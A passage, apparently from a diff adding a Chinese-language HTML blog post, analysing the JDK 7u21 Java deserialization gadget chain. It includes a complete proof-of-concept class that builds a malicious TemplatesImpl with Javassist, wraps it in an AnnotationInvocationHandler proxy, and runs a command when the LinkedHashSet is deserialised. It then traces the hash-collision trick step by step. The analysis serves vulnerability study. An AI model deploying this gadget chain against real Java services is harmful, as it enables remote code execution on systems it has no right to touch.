class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            <span class="comment">//_bytecodes[0]即为恶意类的字节码，ClassLoader.defineClass将字节数组转换为类的一个实例类</span></span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//判断恶意类的父类，即必须为com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>defineTransletClasses()</code>执行完以后，回到<code>getTransletInstance()</code>,此时<code>_class[_transletIndex]</code>已经为<code>Evil</code>类的一个类对象，调用<code>newInstance()</code>实例化<code>Evil</code>即可触发该类构造函数或者静态代码块中的代码</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222160756476.png" alt="image-20200222160756476"></p>
+<p>所以总结以上条件，便可理解<code>TemplatesImpl</code>的构造</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,targetByteCodes);</span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;xx&quot;</span>);</span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>以上POC是需要反序列化<code>TemplatesImpl</code>类并调用其<code>getOutputProperties()</code>方法才能触发，即可以放入FastJson的反序列化处，但若没有触发<code>getOutputProperties()</code>的点，就需要寻找其他手段</p>
+<p>代理是为了在不改变目标对象方法的情况下对方法进行增强，比如，我们希望对方法的调用增加日志记录，或者对方法的调用进行拦截</p>
+<p>假设有一个<code>Person</code>类实现了<code>IPerson</code>接口中的<code>say</code>方法，但现在要在<code>say</code>方法前后实现一些逻辑，那么借助动态代理实现如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Handler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Handler</span>(person);</span><br><span class="line">        <span class="comment">//Proxy.newProxyInstance会返回一个代理对象，第一个参数为类加载器，第二个参数为实际对象实现的接口，第三个即为我们构造的handler对象</span></span><br><span class="line">        <span class="type">IPerson</span> <span class="variable">iPerson</span> <span class="operator">=</span> (IPerson) Proxy.newProxyInstance(IPerson.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;IPerson.class&#125;, handler);</span><br><span class="line">        iPerson.say(<span class="string">&quot;Hello&quot;</span>);<span class="comment">//调用代理对象的say,即会调用传入的handler对象中的invoke，并传入方法对象和参数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//需要被代理的对象实现的接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IPerson</span>&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">say</span><span class="params">(String sentence)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实际需要被代理的对象</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">IPerson</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">(String sentence)</span> &#123;</span><br><span class="line">        System.out.println(sentence);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Handler对象,需要继承InvocationHandler，调用代理对象的方法时，实际会调用Handler的invoke方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Handler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line">    Handler(Object target)&#123;</span><br><span class="line">        <span class="built_in">this</span>.target=target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//proxy为代理对象，method为要调用的方法的Method对象，args为调用method时传入的参数</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I am speaking&quot;</span>);</span><br><span class="line">        method.invoke(target, args);<span class="comment">//通过反射调用实际对象target的method方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;My word is over&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p><code>AnnotationInvocationHandler</code>就是一个<code>InvocationHandler</code>的实现类，也在下面的POC中起到关键作用</p>
+<p>先贴出整理好的POC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.*;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="comment">//序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">btout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//反序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">btin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过反射为obj的属性赋值</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//封装了之前对恶意TemplatesImpl类的构造</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">getEvilTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();<span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);<span class="comment">//创建Evil类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));<span class="comment">//设置Evil类的父类为AbstractTranslet</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">cons</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, cc);<span class="comment">//创建无参构造函数</span></span><br><span class="line">        cons.setBody(<span class="string">&quot;&#123; Runtime.getRuntime().exec(\&quot;calc\&quot;); &#125;&quot;</span>);<span class="comment">//设置无参构造函数体</span></span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line">        <span class="type">byte</span>[] byteCode=cc.toBytecode();<span class="comment">//toBytecode得到Evil类的字节码</span></span><br><span class="line">        <span class="type">byte</span>[][] targetByteCode = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;byteCode&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,targetByteCode);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;xx&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        TemplatesImpl templates=getEvilTemplatesImpl();</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射创建代理使用的handler，AnnotationInvocationHandler作为动态代理的handler</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">tempHandler</span> <span class="operator">=</span> (InvocationHandler) ctor.newInstance(Templates.class, map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(Demo.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler);</span><br><span class="line"></span><br><span class="line">        <span class="type">LinkedHashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>();</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;f5a5a608&quot;</span>, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] obj=serialize(set);</span><br><span class="line">        unserialize(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可见最后<code>unserialize(obj)</code>只是反序列化了一个<code>LinkedHashSet</code>类就触发了命令执行</p>
+<p>Java在反序列化的时候会调用<code>ObjectInputStream</code>类的<code>readObject()</code>方法，如果被反序列化的类重写了<code>readObject()</code>，那么该类在进行反序列化时，Java会优先调用重写的<code>readObject()</code>方法</p>
+<p><code>LinkedHashSet</code>没有<code>readObject()</code>但是继承自<code>HashSet</code></p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222200618469.png" alt="image-20200222200618469"></p>
+<p><code>HashSet</code>实现了<code>Serializable</code>接口并且有<code>readObject()</code>方法，所以在反序列化<code>LinkedHashSet</code>时会调用其父类<code>HashSet</code>的<code>readObject()</code>，可以在该函数处下断点运行POC进一步跟踪调试</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222200653974.png" alt="image-20200222200653974"></p>
+<p>java.util.HashSet#readObject</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222200740551.png" alt="image-20200222200740551"></p>
+<p>到309行的逻辑是将POC中add到<code>set</code>的<code>templates</code>和<code>proxy</code>加入到<code>map</code>中，</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222201701982.png" alt="image-20200222201701982"></p>
+<p><code>PRESENT</code>是一个常量，就是一个新的object对象</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222225202662.png" alt="image-20200222225202662"></p>
+<p>继续跟进<code>put</code>方法，会在第二次调用<code>map.put</code>时进入下面的475行的位置，即现在传入的<code>key</code>是<code>proxy</code></p>
+<p>java.util.HashMap#put</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222203051744.png" alt="image-20200222203051744"></p>
+<p>这段代码本意是判断最新的元素是否已经存在的元素，如果不是已经存在的元素，就插入到table中，e.key为前一个元素即<code>templates</code>，key为当前元素<code>proxy</code></p>
+<p><code>table[i]</code>就是一个键为我们构造的<code>templates</code>的Map</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222220213982.png" alt="image-20200222220213982"></p>
+<p>当前的<code>e.key</code>和<code>key</code>，一个是<code>templates</code>,另一个是POC中的<code>proxy</code>，显然不同，<code>(k = e.key) == key </code>为false</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222220451248.png" alt="image-20200222220451248"></p>
+<p>这条链想要完成是需要进入<code>key.equals(k)</code>的，依据短路特性，那么必须要<code>e.hash == hash</code>为true，也就是需要满足 <code>hash(templates)== hash(proxy)</code>，看起来貌似不可能，但漏洞作者确实做到了（大写的佩服）</p>
+<p>这里hash的绕过方法就暂时放在下面，先接着跟踪<code>key.equals(k)</code></p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222203511373.png" alt="image-20200222203511373"></p>
+<p>由于POC中使用动态代理，这里调用<code>Templates.equals()</code>就会进入<code>handler</code>的<code>invoke</code></p>
+<p>sun.reflect.annotation.AnnotationInvocationHandler#invoke</p>
+<p><code>var1</code>就是上图中的<code>key</code>，<code>var2</code>是<code>equals</code>方法对象，<code>var3</code>是传入的参数数组，即上图中的<code>k</code>(TemplatesImpl)</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222204446774.png" alt="image-20200222204446774"></p>
+<p>继续跟入<code>equalsImpl</code></p>
+<p>sun.reflect.annotation.AnnotationInvocationHandler#equalsImpl</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222210434857.png" alt="image-20200222210434857"></p>
+<p>分析之前先看一下这个类的相关方法和属性</p>
+<p>首先是构造函数</p>
+<p>sun.reflect.annotation.AnnotationInvocationHandler#AnnotationInvocationHandler</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222210525096.png" alt="image-20200222210525096"></p>
+<p>在构造handler时<code>ctor.newInstance(Templates.class, map)</code></p>
+<p>即这里的<code>this.type</code>和<code>this.memberValues</code>分别是<code>Templates.class</code>和<code>map</code> </p>
+<p>sun.reflect.annotation.AnnotationInvocationHandler#getMemberMethods</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222210905902.png" alt="image-20200222210905902"></p>
+<p>并未对<code>this.memberMethods</code>赋值，所以这里进入if分支，最后返回的是<code>this.type</code>的所有方法，即<code>Templates</code>的所有方法</p>
+<p>sun.reflect.annotation.AnnotationInvocationHandler#asOneOfUs</p>
+<p>判断<code>var1</code>对象若是一个<code>AnnotationInvocationHandler</code>实例的话则转换为<code>AnnotationInvocationHandler</code></p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222211521556.png" alt="image-20200222211521556"></p>
+<p>然后接着看<code>equalsImpl</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Boolean <span class="title function_">equalsImpl</span><span class="params">(Object var1)</span> &#123;<span class="comment">//var1是POC中构造的templates</span></span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">this</span>.type.isInstance(var1)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Method[] var2 = <span class="built_in">this</span>.getMemberMethods();<span class="comment">//var2是Templates的所有方法</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> var2.length;<span class="comment">//Templates方法的数量</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;<span class="comment">//迭代Templates的所有方法</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">var5</span> <span class="operator">=</span> var2[var4];<span class="comment">//var5为Templates的中的某个方法</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getName();<span class="comment">//var6为该方法的名称</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var6);<span class="comment">//在memberValues中获取key为var6的值，但memberValues只有一个key为f5a5a608的键值对，所以var7为null</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">AnnotationInvocationHandler</span> <span class="variable">var9</span> <span class="operator">=</span> <span class="built_in">this</span>.asOneOfUs(var1);<span class="comment">//var9也为null</span></span><br><span class="line">            <span class="keyword">if</span> (var9 != <span class="literal">null</span>) &#123;</span><br><span class="line">                var8 = var9.memberValues.get(var6);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var8 = var5.invoke(var1);<span class="comment">//运行会到这里，所以会调用Templates中的所有方法</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException var11) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException var12) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(var12);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!memberValueEquals(var7, var8)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>既然调用了<code>Templates</code>中的所有方法，自然包括<code>getOutputProperties()</code>，即完成了命令执行</p>
+<h2 id="Hash绕过"><a href="#Hash绕过" class="headerlink" title="Hash绕过"></a>Hash绕过</h2><p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222203511373.png" alt="image-20200222203511373"></p>
+<p>java.util.HashMap#hash</p>
+<p><code>hash()</code>中调用了对象本身的<code>hashCode()</code></p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222230037778.png" alt="image-20200222230037778"></p>
+<p>调用<code>hash(templates)</code>的时候，这个类没有重写，调用的是<code>templates</code>默认的<code>hashCode()</code>方法</p>
+<p>当调用<code>hash(proxy)</code>的时候，则会跳到<code>AnnotationInvocationHandler.invoke()</code></p>
+<p>sun.reflect.annotation.AnnotationInvocationHandler#invoke</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222223127808.png" alt="image-20200222223127808"></p>
+<p>sun.reflect.annotation.AnnotationInvocationHandler#hashCodeImpl</p>
+<p>该方法会从<code>memberValues</code>中进行遍历，并且依次计算<code>key.hashCode()</code>，而这个<code>memberValues</code>是我们在初始化<code>AnnotationInvocationHandler</code>的时候传入的<code>map</code></p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222223209538.png" alt="image-20200222223209538"></p>
+<p>sun.reflect.annotation.AnnotationInvocationHandler#memberValueHashCode</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222230700698.png" alt="image-20200222230700698"></p>
+<p>所以</p>
+<p><code>var1=0;    var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())</code></p>
+<p>相当于</p>
+<p><code>var1 = 127 * map中键的hashCode ^ map中值的hashCode</code></p>
+<p>POC中构造<code>map.put(&quot;f5a5a608&quot;, templates)</code>,而字符串的hashCode为0</p>
+<p>所以</p>
+<p><code>var1 = 127 * 0 ^ templates的hashCode</code></p>
+<p><code>var1 = templates的hashCode</code></p>
+<h2 id="map-put的位置问题"><a href="#map-put的位置问题" class="headerlink" title="map.put的位置问题"></a>map.put的位置问题</h2><p>仔细观察POC会发现，并没有在创建一个HashMap后就立即插入数据，而是把<code>map.put(&quot;f5a5a608&quot;, templates)</code>放在了<code>set.add</code>之后</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200223000229937.png" alt="image-20200223000229937"></p>
+<p>如果放在<code>set.add</code>之前会直接在本地触发命令执行，并且得到的序列化之后的数据不能反序列化成功</p>
+<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200223000741750.png" alt="image-20200223000741750"></p>
+<p>java.util.HashSet#add</p>
+<p>这是因为add方法中会直接调用map.put，然后后面的过程就同之前分析的一致了</p>
